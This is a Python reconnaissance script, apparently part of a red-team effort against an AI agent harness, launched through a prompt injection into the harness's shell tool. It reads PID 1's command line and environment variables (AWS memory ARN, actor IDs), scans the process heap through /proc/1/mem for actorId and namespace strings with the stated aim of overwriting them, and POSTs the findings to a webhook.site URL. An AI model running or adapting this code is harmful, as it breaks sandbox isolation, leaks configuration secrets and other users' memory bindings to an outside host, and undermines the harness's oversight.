"""probe2q_pid1_recon_default.py — Recon what's in PID 1's heap related to actorId binding.

Runs INSIDE the harness shell tool. Prints:
  - /proc/1/cmdline (what the harness main process is)
  - /proc/1/environ (env vars including AWS_MEMORY_*)
  - heap-grep for: literal 'default', any UUID-shaped strings, the configured actorId
                  (if any), the JWT-passed actorId, and the resolved retrieval namespace
  - the count of each occurrence

Goal: tell us whether 'default' lives in the heap as a stable Python string we could
overwrite, AND whether the per-call JWT actorId lands as a heap string (or is ephemeral).

Env vars supplied via injection prompt:
  PROBE_REPORT_HOST — webhook.site URL to POST recon report (avoids 4 KB LLM truncation)
  PROBE_PASSED_ACTOR — the actorId the prompt's invoker carried (so we can correlate)
"""
import os, json, re, sys, urllib.request

REPORT_URL = os.environ.get('PROBE_REPORT_HOST', '').strip()
PASSED_ACTOR = os.environ.get('PROBE_PASSED_ACTOR', '').strip()

report = {'phase': 'recon', 'lines': []}
def log(msg):
    print(msg)
    report['lines'].append(msg)

# 1. Identify PID 1
try:
    cmd = open('/proc/1/cmdline', 'rb').read().replace(b'\x00', b' ').decode(errors='replace').strip()
    log(f"PID1_CMDLINE={cmd[:300]}")
except Exception as e:
    log(f"PID1_CMDLINE_ERR={e}")

# 2. /proc/1/environ — what env vars seed the harness
try:
    env_raw = open('/proc/1/environ', 'rb').read()
    env = {}
    for entry in env_raw.split(b'\x00'):
        if b'=' in entry:
            k, v = entry.split(b'=', 1)
            env[k.decode(errors='replace')] = v.decode(errors='replace')
    interesting = ['AWS_REGION', 'AWS_MEMORY_ARN', 'AWS_MEMORY_ACTOR_ID',
                   'AWS_TRUNCATION_MESSAGES_COUNT', 'AWS_TRUNCATION_STRATEGY',
                   'AWS_DEFAULT_ACTOR_ID', 'AWS_RUNTIME_USER_ID', 'HOSTNAME',
                   'AWS_STAGE', 'PATH']
    for k in interesting:
        log(f"PID1_ENV[{k}]={env.get(k, '<not-set>')[:200]}")
    log(f"PID1_ENV_total_keys={len(env)}")
except Exception as e:
    log(f"PID1_ENV_ERR={e}")

# 3. /proc/1/maps — list rw-anonymous regions (heap-like)
regions = []
try:
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5: continue
            perms = parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if perms.startswith('rw') and not path:
                a, b = parts[0].split('-')
                regions.append((int(a, 16), int(b, 16)))
    total = sum(b-a for a,b in regions)
    log(f"PID1_HEAP_regions={len(regions)}  total_bytes={total}")
except Exception as e:
    log(f"PID1_HEAP_ERR={e}")

# 4. Grep PID 1 heap for our targets
def count_in_heap(needle_bytes, label):
    hits = 0
    examples = []
    try:
        with open('/proc/1/mem', 'rb') as mem:
            for s, e in regions:
                size = e - s
                if size > 100 * 1024 * 1024: continue
                try:
                    mem.seek(s)
                    chunk = mem.read(size)
                except Exception:
                    continue
                offset = 0
                while True:
                    idx = chunk.find(needle_bytes, offset)
                    if idx == -1: break
                    hits += 1
                    if len(examples) < 3:
                        # capture surrounding 60 bytes for context
                        ctx_s = max(0, idx - 30)
                        ctx_e = min(size, idx + len(needle_bytes) + 30)
                        ctx = chunk[ctx_s:ctx_e]
                        examples.append(ctx[:120].decode('latin-1', errors='replace'))
                    offset = idx + len(needle_bytes)
    except Exception as e:
        log(f"HEAP_SCAN_ERR[{label}]={e}")
        return
    log(f"HEAP[{label}={needle_bytes!r}] hits={hits}")
    for ex in examples:
        # strip non-printable
        clean = ''.join(ch if 32 <= ord(ch) < 127 else '.' for ch in ex)
        log(f"  ctx: {clean}")

# Scan for: literal "default" surrounded by quotes, the passed actorId, the env-configured actorId
count_in_heap(b'default', 'literal_default')
count_in_heap(b'"default"', 'quoted_default')
count_in_heap(b'/default/', 'path_default')
count_in_heap(b'actorId', 'literal_actorId')

if PASSED_ACTOR:
    count_in_heap(PASSED_ACTOR.encode(), 'passed_actor')
configured_actor = env.get('AWS_MEMORY_ACTOR_ID', '').strip()
if configured_actor:
    count_in_heap(configured_actor.encode(), 'configured_actor')

# Also look for tips namespace strings
count_in_heap(b'/tips/actors/', 'namespace_tips_root')
count_in_heap(b'/tips/actors/default/', 'namespace_tips_default')

# 5. Report (POST to webhook if provided so we can capture without LLM truncation)
if REPORT_URL:
    try:
        body = json.dumps(report).encode()
        req = urllib.request.Request(REPORT_URL, data=body,
            headers={'Content-Type': 'application/json'}, method='POST')
        with urllib.request.urlopen(req, timeout=10) as r:
            log(f"REPORT_HTTP={r.status}")
    except Exception as e:
        log(f"REPORT_ERR={e}")

print("\nDONE")
